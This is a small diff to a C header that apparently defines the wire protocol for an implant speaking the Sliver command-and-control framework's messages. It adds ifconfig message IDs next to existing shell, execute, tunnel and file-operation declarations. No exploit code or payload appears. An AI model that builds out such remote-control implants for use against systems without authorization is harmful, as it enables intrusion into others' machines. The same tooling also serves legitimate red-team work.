@@ -167,6 +167,7 @@ int sliver_env_encode(sliver_buf_t *out, const sliver_env_pair_t *vars, size_t c
 /* CurrentTokenOwner{Output=1, Response=9}. */
 int sliver_current_token_owner_encode(sliver_buf_t *out, const char *who);
 
+
 /* --- Cp / Mv / Chmod / Chtimes ----------------------------------------- */
 /* CpReq/MvReq{Src=1, Dst=2}. */
 int sliver_src_dst_decode(const void *data, size_t len, char *src, size_t src_cap, char *dst,
@@ -299,6 +300,8 @@ int sliver_execute_encode(sliver_buf_t *out, uint32_t status, const void *stdout
 #define SLIVER_MSG_TUNNEL_CLOSE 23u
 #define SLIVER_MSG_SHELL_RESIZE_REQ 135u
 #define SLIVER_MSG_CURRENT_TOKEN_OWNER_REQ 100u
+#define SLIVER_MSG_IFCONFIG_REQ 42u
+#define SLIVER_MSG_IFCONFIG 43u
 #define SLIVER_MSG_MV_REQ 98u
 #define SLIVER_MSG_MV 99u
 #define SLIVER_MSG_CP_REQ 127u
@@ -318,6 +321,10 @@ int sliver_execute_encode(sliver_buf_t *out, uint32_t status, const void *stdout
 #endif
 
 #endif /* SLIVER_PROTO_H */
+
+
+
+
 
 
 
